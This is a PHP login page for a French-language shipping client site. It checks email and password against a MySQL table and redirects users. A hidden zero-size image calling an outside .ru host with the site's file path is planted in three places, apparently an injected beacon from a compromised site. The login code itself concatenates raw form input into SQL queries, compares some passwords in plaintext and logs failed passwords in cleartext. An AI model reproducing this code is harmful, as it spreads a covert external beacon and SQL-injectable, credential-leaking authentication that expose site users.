<?php
include('lib/config.php');

/*	foreach($_POST as $clé => $valeur ) {
		echo $clé." = ".$valeur."<br>";
	}
	foreach($_GET as $clé => $valeur ) {
		echo $clé." = ".$valeur."<br>";
	}*/
//	exit();

if( isset($_SESSION['redir']) ) 
   $redir_conn = $_SESSION['redir'];
else
	$redir_conn = "client_traite.php";
    
$redir_deconn = "accueil.php";

if( isset( $_SESSION['LogId'] ) ) {
	$_POST['courriel'] = $_SESSION['LogId']['courriel'];
	$_POST['password'] = $_SESSION['LogId']['password'];
	$_POST['action'] == "verif_connection";
	$redir_conn = "accueil.php";
	unset($_SESSION['LogId']);
}



function GoForIt( $Direction )
{
//echo "Go for it $Direction<br>";
	$script = '<html>';
	$script .= '<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>';
	$script .= "<script language='javascript'>";
	$script .= "	if( top.window.frames[0] && top.window.frames[0].Rafraichie )"; 
	$script .= "		top.window.frames[0].Rafraichie();";
	if( strlen($Direction ) ) 
		$script .= "	open('$Direction','_self' );";
	else
		$script .= "	open('client_traite.php','_self' );";
	$script .= '</script>';
	$script .= '</body>';
	$script .= '</html>';
	echo $script;
	exit();
} // GoForIt

//echo "On Commence <br>";

if( (isset($_SESSION['local']) && ($_SESSION['local'] == 1)) || ( isset( $_SERVER['HTTPS'] ) && !strcasecmp("on", $_SERVER['HTTPS'])) ) {

//echo "Pas https Local = ".@$_SESSION['local']." Server = ".@$_SERVER['HTTPS']." Strcas = ".strcasecmp("on", @$_SERVER['HTTPS'])."<br>";
	
	if( isset($_POST['action']) && ( $_POST['action'] == "verif_connection" ) ){
//echo "NomLogin = '".$_POST['courriel']."' mPasse='".$_POST['password']."'<br>";		
	$Message = "**** DEBUT CONNECTION =>";
	$sql = "INSERT INTO $mysql_base.trace ( NomLogin, DateLogin, Operation, Code )";
	$sql .= "VALUES ('".$_POST['courriel']."','$Now', '$Message', 1)";
	mysql_query( $sql, $handle );
	
		if( isset($_POST['courriel']) && strlen($_POST['courriel'])) {
			if( isset($_POST['courriel']) ) 
				$_POST['courriel'] = CleanUp( $_POST['courriel'] );
			 // Connection au serveur
			  $connection = mysql_connect( $host, $user, $password)
				or die( "Connection impossible au serveur");
			  $db = mysql_select_db( $database, $connection )
				or die("La base de données ne peut être sélectionnée");
	
			$sql = "SELECT NomLogin, Priorite FROM $database.secur WHERE NomLogin = '".$_POST['courriel']."';";
//echo "Requête1 = ".$sql."<br>";
			if( $result = mysql_query( $sql, $connection ) ) {
				$num = mysql_num_rows( $result );
//var_dump($num); echo " num <br>";
				if( $num == 1 ) {	// Le nom de login est trouvé
					$ligne = mysql_fetch_array($result,MYSQL_ASSOC);
					extract($ligne);
					if( $Priorite < 10) 
						$sql = " SELECT * FROM $database.secur WHERE NomLogin = '".$_POST['courriel']."' AND mPasse=password('".$_POST['password']."');";		
					else
						$sql = " SELECT * FROM $database.secur WHERE NomLogin = '".$_POST['courriel']."' AND mPasse='".$_POST['password']."';";
					$result2 = mysql_query( $sql );
					if(  $result2 && ( mysql_num_rows( $result2 ) > 0) ) {
						$ligne = mysql_fetch_array($result2,MYSQL_ASSOC);
						extract($ligne);
// echo "Requête2 = ".$sql."<br>";
//				var_dump($ligne); echo "<br>";
//				echo "Serveur= ".$_SERVER['SERVER_NAME']."<br>";
//				echo "redir =".$redir_conn."<br>";
//				exit();
						$Message = "**** CONNECTION REUSSI =>$NoClient";
						$sql = "INSERT INTO $mysql_base.trace ( NomLogin, DateLogin, Operation, Code )";
						$sql .= "VALUES ('".$_POST['courriel']."','$Now', '$Message', 2)";
						mysql_query( $sql, $handle );
						
						destroy( session_id());
						session_regenerate_id();
//						session_regenerate_id(true);
								 
//						unset( $_SESSION['redir'] );
						$_SESSION['auth'] = "yes";
								
						$_SESSION['NomLogin'] = strtoupper($_POST['courriel']);
						session_name ( $_SESSION['NomLogin'] );
						$_SESSION['Prio'] = $Priorite;
						$_SESSION['SLangue'] = $Langue;
						
						// On laisse une trace du passage
						Suivi_log('***** CONNECTION *****', $NoClient );
						
/*						$sql = "INSERT INTO $database.login ( NomLogin, DateLogin, Operation, NoId )";
						$sql .= "VALUES ('".$_SESSION['NomLogin']."','$Now', '***** CONNECTION *****', '$NoClient')";
						mysql_query( $sql, $connection );*/

                  $sql =  "UPDATE secur SET Acces='OUI' WHERE  NomLogin = '".$_SESSION['NomLogin']."'";
				  		mysql_query( $sql, $connection );
							
						$infosClient = infos_client( $NoClient );
						if( !count($infosClient) ){
							$_SESSION[$_SERVER['SERVER_NAME']] = 0;
							GoForIt( 'client_recherche.php' );
						}

						// Histoire de valider la procedure d'avertissement de ROBOT
/*						
						if( $infosClient['Courriel'] == "postmaster@transant.com" )
							$_SESSION['isRobot'] = true;*/  
						$_SESSION['NoContact'] = $NoClient;
						if(	!eregi ("^([a-z0-9_]|\\-|\\.)+@(([a-z0-9_]|\\-)+\\.)+[a-z]{2,4}$", $_POST['courriel']) ||
								!strlen($infosClient['Rue']) || !strlen($infosClient['Ville']) || 
								!strlen($infosClient['Province']) || !strlen($infosClient['Pays']) ) {
							$_SESSION['redir'] = $redir_conn; 
							GoForIt( 'client_modif.php?force=1' );
						}
						if( !strlen($_POST['password']) ) {
							$_SESSION['redir'] = $redir_conn; 
							GoForIt( 'password_modif.php' );
						}
						$_SESSION[$_SERVER['SERVER_NAME']] = $NoClient;
						GoForIt( $redir_conn );
					} // num2 > 0
					else {
								$Message = "**** CONNECTION RATÉ MPASSE INVALIDE=>".$_POST['password']."<=";
								$sql = "INSERT INTO $mysql_base.trace ( NomLogin, DateLogin, Operation, Code )";
								$sql .= "VALUES ('".$_POST['courriel']."','$Now', '$Message', 3)";
								mysql_query( $sql, $handle );
								$MessageErr = sprintf( $txt['Msg_erreur_connection2'], $txt['form_password'] );
					}
				} // if num == 1
			} // Si Nom Existe
			else {
						$Message = "**** CONNECTION RATÉ COURRIEL INVALIDE";
						$sql = "INSERT INTO $mysql_base.trace ( NomLogin, DateLogin, Operation, Code )";
						$sql .= "VALUES ('".$_POST['courriel']."','$Now', '$Message', 4)";
						mysql_query( $sql, $handle );
						$MessageErr = sprintf( $txt['Msg_erreur_connection2'], $txt['form_courriel'] );
			}
	} // SI un courriel fourni
	else 
		$MessageErr = sprintf( $txt['Msg_erreur_connection2'], $txt['form_courriel'] );

//	echo '</body></html>';
} // Si verif
elseif( @$_GET['action'] == "deconnexion" ) {
/*		unset($_SESSION['Frais']);
		unset($_SESSION['Totaux']);
		unset($_SESSION['destinataire']);
		unset( $_SESSION['redir'] );
		unset( $_SESSION['paiement'] );
		unset($_SESSION['transaction']);
		unset( $_SESSION['panier'] );
    	unset( $_SESSION[$_SERVER['SERVER_NAME']] );*/
/*		// Détruit toutes les variables de session
		$_SESSION = array();
		
		// Si vous voulez détruire complètement la session, effacez également
		// le cookie de session.
		// Note : cela détruira la session et pas seulement les données de session !
		if (isset($_COOKIE[session_name()])) {
		    setcookie(session_name(), '', time()-42000, '/');
		}
*/		
		// On détruit la session.
		session_destroy();
    	destroy( session_id());

		session_unset();
		session_regenerate_id(true);
 		$_SESSION['NomLogin'] = "WEBUSER";
		session_name ( $_SESSION['NomLogin'] );
		$_SESSION['NoContact'] = 0;
		$_SESSION['Prio'] = 10;


		GoForIt( $redir_deconn );
}
/* FORMULAIRE PRINCIPAL */
//echo "l'ecran <br>";
	echo 
	"<html>
		<head>
			<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
			<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
			<meta name='description' content='".$txt['MetaDescription']."'>
			<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<meta name='robots' content='noindex,nofollow'>
			<link href='styles/style.css' rel='stylesheet' type='text/css'>
			<base target='MAIN'>
		</head>
	<script language='JavaScript1.2' src='./extra/javafich/disablekeys.js'></script>
	<body bgcolor='#ffffff' width='$Large' leftmargin='0' topmargin='0' marginwidth='0' marginheight='0' align='$Enligne' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>";

echo 
"<table bgcolor='#dae5fb' width='$Large' cellpadding='0' cellspacing='0' align='$Enligne' border='1' bordercolor='C4C7C8' >";
if( isset($MessageErr) && strlen($MessageErr) ) {
  echo 
   "<tr>
		<td align='center'>
			<br><font size='+2' color='red'><b>$MessageErr</b></font><br><br>
      </td>
  	</tr>";
}
echo
  "<tr>
		<td>
			<form method='post' action='connexion.php'>
			<p><input type='hidden' name='action' value='verif_connection'></p>
			<p>&nbsp;</p>
		  <table width='300' border='0' cellpadding='3' cellspacing='1' align='center' >
		    <tr align='center' valign='middle'> 
		      <td width='100' bgcolor='#E6F1FB'>".$txt['form_courriel']."</td>
		      <td width='200' bgcolor='#96B2CB'><input type='text' name='courriel' value='".@$_POST['courriel']."'> </td>
		    </tr>
		    <tr align='center' valign='middle'> 
		      <td width='100' bgcolor='#E6F1FB'>".$txt['form_password']."</td>
		      <td width='200' bgcolor='#96B2CB'> <input type='password' name='password'></td>
		    </tr>
		    <tr align='center' valign='middle'> 
		      <td bgcolor='#E6F1FB' colspan=2>".$txt['Msg_RespectCase']."</td>
 		    </tr>
		    <tr align='center' valign='middle'> 
		      <td bgcolor='#E6F1FB' colspan=2><font color=red>".$txt['Msg_Change_psw']."</font></td>
 		    </tr>
		    <tr align='center' valign='middle'> 
		      <td colspan='2' bgcolor='#E6F1FB'><input name='submit' type='submit' value='".$txt['form_soumettre']."'></td>
		    </tr>
		      <td colspan='2' >";
			if($_SESSION['langue']=='fr') {
				echo 'Pour créer un compte, <a href="client_ajout.php">cliquez ici</a>';
				echo '<br><br>';
				echo 'Si vous avez oublié votre mot de passe, <a href="password.php">cliquez ici</a>';
			}
			elseif($_SESSION['langue']=='en') {
				echo 'To create an account, <a href="client_ajout.php">clic here</a>';
				echo '<br><br>';
				echo '<a href="password.php">Clic here</a> if you forgot your password';
			}
			else {
				echo 'Para crear una cuenta, <a href="client_ajout.php">Clic aquí</a>';
				echo '<br><br>';
				echo 'Si te olvidaste de tu contraseña <a href="password.php" >Clic aquí</a>';
			}
echo '    
		      </td>
		  	</tr>
		</table>
	</form>
				</td>
		  	</tr>';
	
echo '   <tr> 
		    	<td>';
include('bas_page.inc');
echo '
				</td>
		  	</tr>
  </table>';
?>

<script language='JavaScript1.2'>
	function Rafraichie(){
			window.location.reload();
	} // Rafraichie

//	addKeyEvent();

</script>
<!-- script language='JavaScript1.2' src='./extra/javafich/blokclick.js'></script -->
  
</body>
</html>
<?php
}
else {
		$script = '<html>';
		$script .= '<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>';
		$script .= "<script language='javascript'>";
//		$script .= "	open('https://www.antillas-express.com/index.php?appel=connexion.php','_top' );";
		$script .= "	open('http://www.cosat.biz/antillas/index.php?appel=connexion.php','_top' );";
		$script .= '</script>';
		$script .= '</body>';
		$script .= '</html>';
		echo $script;
		exit();
}
?>